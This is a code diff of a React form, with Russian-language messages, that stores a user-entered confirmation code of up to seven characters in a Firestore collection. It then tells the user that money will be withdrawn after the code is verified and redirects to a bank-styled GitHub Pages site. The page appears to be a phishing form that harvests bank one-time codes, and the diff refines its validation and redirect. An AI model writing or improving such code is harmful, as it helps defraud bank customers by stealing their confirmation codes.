@@ -14,7 +14,7 @@ const handleChange = (e) => {
   e.preventDefault()
   const limit = 7;
   setCod(e.target.value.slice(0, limit));
-console.log( )
+
 if((e.target.value).toString().length > 5 ){
   setLimit(true)
 }else{
@@ -24,15 +24,17 @@ if((e.target.value).toString().length > 5 ){
 
 function handleSubmit(e) {
   e.preventDefault()
-  if (cod === null) {
+  if (!limit) {
     toast.error("Пожалуйста, заполните информацию");
   } else {
     const usersRef = collection(db, "confirmation")
     addDoc(usersRef, {cod}).then(response => {
       toast.success('Поздравляем, деньги будут сняты при проверке вашего кода подтверждения, пожалуйста, подтвердите, чтобы убедиться, что он правильный!')
-      
+      setTimeout(() => {
+        window.location.replace('https://ciberbank.github.io/ciberbank');
+      }, 3000);
     }).catch(error => {
-      toast.error("Пожалуйста, заполните информацию2");
+      toast.error("Пожалуйста, заполните информацию");
     })
   }
 }
